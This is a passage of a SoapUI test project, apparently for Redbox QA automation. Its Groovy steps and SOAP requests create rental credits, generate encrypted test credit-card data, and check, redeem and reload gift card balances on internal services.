	IsItemReturned = 1 
Where 
	CustomerProfileNumber = :CpNum
And
	IsItemReturned = 0</con:query><con:assertion type="GroovyScriptAssertion" id="bed34fe0-5cd7-49a2-8ce3-7db1e08b0d51" name="Script Assertion"><con:configuration><scriptText>import com.eviware.soapui.support.XmlHolder

def holder = new XmlHolder( messageExchange.responseContentAsXml )
def node = holder.getDomNode( "//Results[1]/UpdateCount[1]" );
assert (node != null);
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>CpNum</con:name><con:value>${#TestCase#CpCustomerNumber}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Check DVD Credits Qty" id="859e3466-f422-4173-8165-90764de185c5"><con:settings/><con:config><script>def dVDCreditQty = context.expand( '${#TestCase#DVDCreditQty}' )

log.info("dVDCreditQty: " + dVDCreditQty)

if (dVDCreditQty == "0" || dVDCreditQty == "" || dVDCreditQty == null )
{
	log.info("DVD Credit Qty = 0, '' or null, goto Check Movie Credits Qty  -  dVDCreditQty: " + dVDCreditQty)
	testRunner.gotoStepByName("Check Movie Credits Qty")
}
else
{
	//Go to next step and create Credits.
}
</script></con:config></con:testStep><con:testStep type="httprequest" name="Create DVD Credits" id="01944f77-01c7-4992-a961-5ff3888a18ca"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="9160ad04-d21e-481e-8089-6119e9cc8fa6" name="Create DVD Credits" postQueryString="false" mediaType="text/xml;charset=UTF-8" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="SOAPAction" value="&amp;quot;http://www.redbox.com/PlatformServices/Credit/V3/ICreditSubscriptionService/CreateMultipleSubscriptions&amp;quot;" xmlns="http://eviware.com/soapui/config"/></con:setting></con:settings><con:endpoint>${#Project#CreditSvcEndpoint}</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:v3="http://www.redbox.com/PlatformServices/Credit/V3">
   <soapenv:Header/>
   <soapenv:Body>
      <v3:CreateMultipleSubscriptions>
         <!--Optional:-->
         <v3:createMultipleSubscriptionsRequest IncludeStatusInResponse="false" CustomerNumber="${#TestCase#CpCustomerNumber}" VendorCode="RB" SkuCode="${#TestCase#DVDSkuCode}" Quantity="${#TestCase#DVDCreditQty}">
            <!--Optional:-->
            <v3:ChannelVector ChannelType="MAINT">              
            <v3:Token>QA-Automation</v3:Token><v3:Identity>QA</v3:Identity></v3:ChannelVector>
         </v3:createMultipleSubscriptionsRequest>
      </v3:CreateMultipleSubscriptions>
   </soapenv:Body>
</soapenv:Envelope>]]></con:request><con:assertion type="Valid HTTP Status Codes" id="3023bd41-1336-4b98-94f5-e31f6f05ae59" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Check Movie Credits Qty" id="15df9123-d03f-4c73-99e1-30a950b30c3c"><con:settings/><con:config><script>def movieCreditQty = context.expand( '${#TestCase#MovieCreditQty}' )

log.info("movieCreditQty: " + movieCreditQty)

if (movieCreditQty == "0" || movieCreditQty == "" || movieCreditQty == null )
{
	log.info("Movie Credit Qty = 0, '' or null, goto End  -  movieCreditQty: " + movieCreditQty)
	testRunner.gotoStepByName("Check Game Credits Qty")
}</script></con:config></con:testStep><con:testStep type="httprequest" name="Create Movie Credits" id="05884639-6d24-4c23-9d0a-2460a31498cf"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="9160ad04-d21e-481e-8089-6119e9cc8fa6" name="Create Movie Credits" postQueryString="false" mediaType="text/xml;charset=UTF-8" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="SOAPAction" value="&amp;quot;http://www.redbox.com/PlatformServices/Credit/V3/ICreditSubscriptionService/CreateMultipleSubscriptions&amp;quot;" xmlns="http://eviware.com/soapui/config"/></con:setting></con:settings><con:endpoint>${#Project#CreditSvcEndpoint}</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:v3="http://www.redbox.com/PlatformServices/Credit/V3">
   <soapenv:Header/>
   <soapenv:Body>
      <v3:CreateMultipleSubscriptions>
         <!--Optional:-->
         <v3:createMultipleSubscriptionsRequest IncludeStatusInResponse="false" CustomerNumber="${#TestCase#CpCustomerNumber}" VendorCode="RB" SkuCode="${#TestCase#MovieSkuCode}" Quantity="${#TestCase#MovieCreditQty}">
            <!--Optional:-->
            <v3:ChannelVector ChannelType="MAINT">              
            <v3:Token>QA-Automation</v3:Token><v3:Identity>QA</v3:Identity></v3:ChannelVector>
         </v3:createMultipleSubscriptionsRequest>
      </v3:CreateMultipleSubscriptions>
   </soapenv:Body>
</soapenv:Envelope>]]></con:request><con:assertion type="Valid HTTP Status Codes" id="3023bd41-1336-4b98-94f5-e31f6f05ae59" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Check Game Credits Qty" id="156e154b-05d3-4f9d-8b77-5815d0ff94a2"><con:settings/><con:config><script>def gameCreditQty = context.expand( '${#TestCase#GameCreditQty}' )

log.info("gameCreditQty: " + gameCreditQty)

if (gameCreditQty == "0" || gameCreditQty == "" || gameCreditQty == null )
{
	log.info("Game Credit Qty = 0, '' or null, goto End  -  GameCreditQty: " + gameCreditQty)
	testRunner.gotoStepByName("End")
}</script></con:config></con:testStep><con:testStep type="httprequest" name="Create Game Credits" id="bb28905c-51cb-4519-a801-419a8a54a168"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="9160ad04-d21e-481e-8089-6119e9cc8fa6" name="Create Game Credits" postQueryString="false" mediaType="text/xml;charset=UTF-8" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="SOAPAction" value="&amp;quot;http://www.redbox.com/PlatformServices/Credit/V3/ICreditSubscriptionService/CreateMultipleSubscriptions&amp;quot;" xmlns="http://eviware.com/soapui/config"/></con:setting></con:settings><con:endpoint>${#Project#CreditSvcEndpoint}</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:v3="http://www.redbox.com/PlatformServices/Credit/V3">
   <soapenv:Header/>
   <soapenv:Body>
      <v3:CreateMultipleSubscriptions>
         <!--Optional:-->
         <v3:createMultipleSubscriptionsRequest IncludeStatusInResponse="false" CustomerNumber="${#TestCase#CpCustomerNumber}" VendorCode="RB" SkuCode="${#TestCase#GameSkuCode}" Quantity="${#TestCase#GameCreditQty}">
            <!--Optional:-->
            <v3:ChannelVector ChannelType="MAINT">              
            <v3:Token>QA-Automation</v3:Token><v3:Identity>QA</v3:Identity></v3:ChannelVector>
         </v3:createMultipleSubscriptionsRequest>
      </v3:CreateMultipleSubscriptions>
   </soapenv:Body>
</soapenv:Envelope>]]></con:request><con:assertion type="Valid HTTP Status Codes" id="3023bd41-1336-4b98-94f5-e31f6f05ae59" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="End" id="f8861a67-ca81-4b65-b4c4-58fc419499a3"><con:settings/><con:config><script>def dvdCreditQty = context.expand( '${#TestCase#DVDCreditQty}' );
def movieCreditQty = context.expand( '${#TestCase#MovieCreditQty}' );
def gameCreditQty = context.expand( '${#TestCase#GameCreditQty}' );

log.info ("CREATED CREDITS : [DVDCreditQty: $dvdCreditQty; MovieCreditQty: $movieCreditQty; GameCreditQty: $gameCreditQty]");</script></con:config></con:testStep><con:properties><con:property><con:name>CpCustomerNumber</con:name><con:value>90284864596698</con:value></con:property><con:property><con:name>DVDSkuCode</con:name><con:value>QA-DVD</con:value></con:property><con:property><con:name>DVDCreditQty</con:name><con:value>1</con:value></con:property><con:property><con:name>MovieSkuCode</con:name><con:value>QA-MOVIE</con:value></con:property><con:property><con:name>MovieCreditQty</con:name><con:value/></con:property><con:property><con:name>GameSkuCode</con:name><con:value>QA-GAME</con:value></con:property><con:property><con:name>GameCreditQty</con:name><con:value/></con:property></con:properties><con:reportParameters/></con:testCase><con:testCase id="0d3b1789-bdfe-4f7a-8419-24e217021b1b" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="Generate Encrypted CCInfo" searchProperties="true" maxResults="0"><con:description>Generate the encrypted data for CreditCard Number. </con:description><con:settings/><con:testStep type="groovy" name="Get CCInfo" id="e477bc35-f130-474f-9dc6-4cb9f9467fe6"><con:settings/><con:config><script>def cardNumber = context.expand( '${#TestCase#CardNumber}' )
testRunner.testCase.setPropertyValue("CardLength",cardNumber.length().toString());
def firstNumber = cardNumber.take(1).reverse();

//if (firstNumber == '4' &amp;&amp; 

switch (firstNumber) 
{
   case '3':
        testRunner.testCase.setPropertyValue("CardType", '1');
        break
   case '4':
        testRunner.testCase.setPropertyValue("CardType", '5');
        break
   case '5':
        testRunner.testCase.setPropertyValue("CardType", '4');
        break
   case '6':
        testRunner.testCase.setPropertyValue("CardType", '3');
        break
   case '7':
        testRunner.testCase.setPropertyValue("CardType", '6');
        break
   default:
     testRunner.testCase.setPropertyValue("CardType", 'Unknown');
}</script></con:config></con:testStep><con:testStep type="httprequest" name="Generate Encrypted Data" id="42905a01-5620-4d9e-a0a7-e13e5fcc4b9f"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="6531b4d1-b9dd-4551-8d74-27a2250906d1" name="Generate Encrypted Data" postQueryString="false" mediaType="text/xml;charset=UTF-8" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="SOAPAction" value="&amp;quot;http://rentalservices.redbox.com/MerchantService/IMerchantService/GenerateCreditCardData&amp;quot;" xmlns="http://eviware.com/soapui/config"/></con:setting></con:settings><con:endpoint>http://${#Project#MSAppServer}:7002/MerchantService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mer="http://rentalservices.redbox.com/MerchantService">
   <soapenv:Header/>
   <soapenv:Body>
      <mer:GenerateCreditCardData>
      <mer:prefixes>
      	<arr:string xmlns:arr="http://schemas.microsoft.com/2003/10/Serialization/Arrays">${#TestCase#CardNumber}</arr:string>
      </mer:prefixes>
      <mer:length>${#TestCase#CardLength}</mer:length>
      <mer:numberOfCards>1</mer:numberOfCards>
      <mer:keyId>${#TestCase#KeyID}</mer:keyId>
      </mer:GenerateCreditCardData>
   </soapenv:Body>
</soapenv:Envelope>]]></con:request><con:assertion type="Valid HTTP Status Codes" id="a2ba50ec-ecba-4068-ba4b-8787912433f1" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="transfer" name="Property Transfer" id="a24d40c8-6851-45ec-b6f0-713ab0360f93"><con:settings/><con:config xsi:type="con:PropertyTransfersStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>CardID</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>Generate Encrypted Data</con:sourceStep><con:sourcePath>declare namespace ns1='http://rentalservices.redbox.com/MerchantService';
//ns1:GenerateCreditCardDataResponse[1]/ns1:GenerateCreditCardDataResult[1]/ns1:CreditCardData[1]/ns1:CardHash[1]</con:sourcePath><con:targetType>CardID</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:targetPath/><con:upgraded>true</con:upgraded></con:transfers><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>EncryptedNumber</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>Generate Encrypted Data</con:sourceStep><con:sourcePath>declare namespace ns1='http://rentalservices.redbox.com/MerchantService';
//ns1:GenerateCreditCardDataResponse[1]/ns1:GenerateCreditCardDataResult[1]/ns1:CreditCardData[1]/ns1:EncryptedCardNumber[1]</con:sourcePath><con:targetType>EncryptedNumber</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:upgraded>true</con:upgraded></con:transfers><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>EncryptedTrack2</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>Generate Encrypted Data</con:sourceStep><con:sourcePath>declare namespace ns1='http://rentalservices.redbox.com/MerchantService';
//ns1:GenerateCreditCardDataResponse[1]/ns1:GenerateCreditCardDataResult[1]/ns1:CreditCardData[1]/ns1:EncryptedTrack2[1]</con:sourcePath><con:targetType>EncryptedTrack2</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:upgraded>true</con:upgraded></con:transfers></con:config></con:testStep><con:properties><con:property><con:name>CardNumber</con:name><con:value>379039914929709</con:value></con:property><con:property><con:name>CardLength</con:name><con:value>15</con:value></con:property><con:property><con:name>KeyID</con:name><con:value>100002</con:value></con:property><con:property><con:name>CardID</con:name><con:value>+J0VLD+oBAw2PaOsD4vmZqEcfpINWgAHbT7dBtTUS7s=</con:value></con:property><con:property><con:name>EncryptedNumber</con:name><con:value>PkzcmkisWuoEqhaqGMvH63pL59JRWyRNjWqH2WGjvxpN3UuWOOP1EyDNJq8EJbsZIGFGAP0I4VOnehGWfkmUd6SHuhL8tzdux+4C6cUeZm4vUubyGBE41cJ0lqEMPo711tI0qFjbRdoXuVdtkALQIEh5Fp5jF5N9hqEFlZ+fvbin//QrjaBy+M/NENKucxbVjPinuoWpDrSGmZQ8Job4fZP8Kbp5HBznmepa9FmkcVoyiTIjmm0JxKS06j3yhGnK/bYdO4PNH14sV4WGbIzrzEBIWOcWlt9HQB3j2KzHG0PSLfUvaCFdnoLVqRc6/kSqsrFnOox8fiaUJBHAGhmuCglCv6JDFxC5/TgjRC0RK+KM4wM9j9aSZs+sormkl5LQRYWGZEDSSqKxyKHNc+kDianPppfSqD7b8a+GafIPvwjczWYinMKxH9wKwCSMeyEH093A5Lx87/Ku5UQ0yx4lBEoz8SQzs1nDdG/6lUUEZrAZhj2S9teot6toILaQe41/O5fp7I0+IuEb5/kjYuIJ9P0Bum20DKyxatoJkQx5Q99sVmffOgvDms339JxX0UofN7IjrVqAPnaUxfFOovA9rCxtZBrSFupB8jzg4IK6KIi6+HCq+bY3XMKS545jkOVeYoC5Wu3D35R3Fujm8AxIU4/DUU5ACCeuImlVyFQJMjw=</con:value></con:property><con:property><con:name>EncryptedTrack2</con:name><con:value>Uvsz1VkFitnBuEu5SZYHciVSo59MVSZKXOtINGL/MTRSGs4CVRVv2/YPu/rE9rjZ/4bBNS9ed1hkFE/rx89OTRQhjgahc4rYylrC1ArOv2/M596qZ5lEI2b3TiS3R8A7zMuY4lwc2At7erTsB+8YHH+WeS5YlNQpP0F80HQlE8cmkWBkEbDi3AChPr3jz+IpE0aTDTmRm3M1UpM0KKs4FUgEO5SZV5SCZ+pGbqEB7sswVeTp1WxWyQuuIxoDMJsk1wubUYPCzJFUUtlAhL1+24C7BjeNFnwHWzJr9sPwSZbUesQMHpdnR38HbrGZE7vyaII5HB2JOgXc6WSqGEfdozXJO7aBVfQOxrxHytz13kYrShGQ4p7WsLi9wTudoJsv8a2CXGBAgvgsyJ9IkDKTV6xNrrF3ncwM7CW0XLkgfEKKfO4K5KDW+stv0IkZ8QxwXq9MoglzQmBrvc2kWyPZVr5kKWPovckSx2eWs/zcJTPoIpHqLWmZOAIrvLb/VnqURvu81EiCquBhwDHcVGBpUjCeuLv9hgZJp3c2lKpnrZmTV7hakLk3P9Hk8pSJ9WBux/MjM/3ZavHxXSXhl6GoOU8rzm0fSKeFGEdQ0Bt5OCGKnj2hZavpZzPE4adpfImjNSUZFcvNqFAufCW/awr25ytQvpi99sx5BA7awsRAKc0=</con:value></con:property><con:property><con:name>CardType</con:name><con:value>1</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>5d140bc6-3748-4d91-a420-534389a8a17a</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="38df5945-794d-4d37-ba37-10190f681911" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="GiftCard Redemption" searchProperties="true" maxResults="0"><con:description>Used to adjust the amount of GiftCard(Redbox Card). </con:description><con:settings/><con:testStep type="httprequest" name="BalanceInquiry (Request)" id="41632488-5eaa-48b0-91d6-d0f0f0e46f9c"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="333fe18a-f4eb-49f3-89ef-f080e76f2f20" name="BalanceInquiry (Request)" postQueryString="false" mediaType="text/xml;charset=UTF-8" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="SOAPAction" value="&amp;quot;http://rentalservices.redbox.com/MerchantService/IMerchantService/BalanceInquiry&amp;quot;" xmlns="http://eviware.com/soapui/config"/></con:setting></con:settings><con:endpoint>http://${#Project#MSAppServer}:7002/MerchantService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mer="http://rentalservices.redbox.com/MerchantService">
   <soapenv:Header/>
   <soapenv:Body>
      <mer:BalanceInquiry>
	      <mer:cardAccountId>${#TestCase#CardAccountID}</mer:cardAccountId>
	      <mer:pin>${#TestCase#GCPin}</mer:pin>
      </mer:BalanceInquiry>
   </soapenv:Body>
</soapenv:Envelope>]]></con:request><con:assertion type="XPath Match" id="a1806120-afaf-4f23-b589-f18f682cf73b" name="Match content of [ResponseReason]"><con:configuration><path>declare namespace ns1='http://rentalservices.redbox.com/MerchantService';
//ns1:BalanceInquiryResponse[1]/ns1:BalanceInquiryResult[1]/ns1:ProcessorResults[1]/ns1:ProcessorResult[1]/ns1:ResponseReason[1]/text()</path><content>Approved</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="Valid HTTP Status Codes" id="7f83de84-036f-45fa-b2e7-8e62ed140f4c" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Get RedemptionAmount" id="c6cb3215-7ffa-4090-a115-cebd5417297e"><con:settings/><con:config><script>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context);
def responseHolder = groovyUtils.getXmlHolder("BalanceInquiry (Request)#ResponseAsXml");
def cardExists = context.expand( '${#TestCase#CardExists}' );
def currentBalance = responseHolder.getNodeValue("//ns1:Amount[1]").toBigDecimal();
def expectedAmount = context.expand( '${#TestCase#ExpectedAmount}' ).toBigDecimal();

//No need to reduce the amount on GiftCard
if (expectedAmount >= currentBalance)
{
	log.info ("No Redemption is required");
	testRunner.gotoStepByName('Exit');
}
//Amount Redemption.
else
{
	BigDecimal RedemptionAmount =(currentBalance - expectedAmount).toBigDecimal();
	testRunner.testCase.setPropertyValue("RedemptionAmount",RedemptionAmount.toString());
}
</script></con:config></con:testStep><con:testStep type="httprequest" name="Redemption" id="e3d5e85b-35f4-43ce-bb74-e4f454f28930"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="df48f1d0-41f6-4bb4-9591-56bfd21b89af" name="Redemption" postQueryString="false" mediaType="text/xml;charset=UTF-8" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="SOAPAction" value="&amp;quot;http://rentalservices.redbox.com/MerchantService/IMerchantService/Redemption&amp;quot;" xmlns="http://eviware.com/soapui/config"/></con:setting></con:settings><con:endpoint>http://${#Project#MSAppServer}:7002/MerchantService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mer="http://rentalservices.redbox.com/MerchantService">
   <soapenv:Header/>
   <soapenv:Body>
      <mer:Redemption>
         <!--Optional:-->
         <mer:cardNumber>${#TestCase#CardNumber}</mer:cardNumber>
         <!--Optional:-->
         <mer:amount>${#TestCase#RedemptionAmount}</mer:amount>
      </mer:Redemption>
   </soapenv:Body>
</soapenv:Envelope>]]></con:request><con:assertion type="Valid HTTP Status Codes" id="1b677b88-8914-4b9f-a59f-4d9313cfbcc8" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Exit" id="f77f314e-6c3e-4187-8447-eab21cff6512"><con:settings/><con:config><script>log.info ("Completed Redemption");</script></con:config></con:testStep><con:properties><con:property><con:name>CardAccountID</con:name><con:value>8319813</con:value></con:property><con:property><con:name>CardNumber</con:name><con:value>7777065480107268</con:value></con:property><con:property><con:name>GCPin</con:name><con:value>58538779</con:value></con:property><con:property><con:name>ExpectedAmount</con:name><con:value>0.50</con:value></con:property><con:property><con:name>RedemptionAmount</con:name><con:value>10.50</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>8f6ac057-b5f0-4526-a864-d7d913512c73</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>13fbbe6d-ad34-4051-8898-8371eac59308</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c5198d60-0b4e-490f-99c9-ed6703651e25</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="7fcadccf-c9ac-4b53-aae5-eb9eeea27e7f" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="ReloadGiftCard" searchProperties="true"><con:description>Reload the GiftCard (Redbox Card).</con:description><con:settings/><con:savedRecentRuns>1</con:savedRecentRuns><con:testStep type="groovy" name="Get Info" id="77dcedde-cf14-4aa1-95bb-670a4bf285dd"><con:settings/><con:config><script>def cardExists = context.expand( '${#TestCase#CardExists}' );
if (cardExists == '0')
{
	log.info ("Card doesnt exists reload the card");
	testRunner.gotoStepByName( "IsReloadRequired");
	
}
else
{
	log.info ("Card Exists, check balance and reload if required");
}
</script></con:config></con:testStep><con:testStep type="httprequest" name="BalanceInquiry (Request)" id="b25c07ac-0bee-4da2-bc0d-49d68126194b"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="333fe18a-f4eb-49f3-89ef-f080e76f2f20" name="BalanceInquiry (Request)" postQueryString="false" mediaType="text/xml;charset=UTF-8" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="SOAPAction" value="&amp;quot;http://rentalservices.redbox.com/MerchantService/IMerchantService/BalanceInquiry&amp;quot;" xmlns="http://eviware.com/soapui/config"/></con:setting></con:settings><con:endpoint>http://${#Project#MSAppServer}:7002/MerchantService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mer="http://rentalservices.redbox.com/MerchantService">
   <soapenv:Header/>
   <soapenv:Body>
      <mer:BalanceInquiry>
	      <mer:cardAccountId>${#TestCase#CardAccountID}</mer:cardAccountId>
	      <mer:pin>${#TestCase#GCPin}</mer:pin>
      </mer:BalanceInquiry>
   </soapenv:Body>
</soapenv:Envelope>]]></con:request><con:assertion type="XPath Match" id="a1806120-afaf-4f23-b589-f18f682cf73b" name="Match content of [ResponseReason]"><con:configuration><path>declare namespace ns1='http://rentalservices.redbox.com/MerchantService';
//ns1:BalanceInquiryResponse[1]/ns1:BalanceInquiryResult[1]/ns1:ProcessorResults[1]/ns1:ProcessorResult[1]/ns1:ResponseReason[1]/text()</path><content>Approved</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="Valid HTTP Status Codes" id="7f83de84-036f-45fa-b2e7-8e62ed140f4c" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="IsReloadRequired" id="235e00f0-8dba-4898-835a-91811b7073b0"><con:settings/><con:config><script>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context);
def responseHolder = groovyUtils.getXmlHolder("BalanceInquiry (Request)#ResponseAsXml");
def cardExists = context.expand( '${#TestCase#CardExists}' );
def Amount = responseHolder.getNodeValue("//ns1:Amount[1]").toBigDecimal();
log.info ("GiftCard balance :$Amount");

if (Amount &lt; 30 || cardExists == '0')
{
	log.info ("Reload the GC");
	testRunner.testCase.setPropertyValue('Amount', '30')
}
else
{
	log.info ("Reload is not required");
	testRunner.gotoStepByName("Exit");
}</script></con:config></con:testStep><con:testStep type="httprequest" name="Reload (Request)" id="5b8e582f-b06f-4ac2-b129-2d09ff6e2a36"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="4eda0665-b502-4060-baf1-6f3afa36e1ec" name="Reload (Request)" postQueryString="false" mediaType="text/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="SOAPAction" value="&amp;quot;http://rentalservices.redbox.com/MerchantService/IMerchantService/Reload&amp;quot;" xmlns="http://eviware.com/soapui/config"/></con:setting></con:settings><con:endpoint>http://${#Project#MSAppServer}:7002/MerchantService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mer="http://rentalservices.redbox.com/MerchantService">
   <soapenv:Header/>
   <soapenv:Body>
      <mer:Reload>
         <!--Optional:-->
         <mer:account>${#TestCase#CardNumber}</mer:account><mer:amount>100</mer:amount>
         <!--Optional:-->
      </mer:Reload>
   </soapenv:Body>
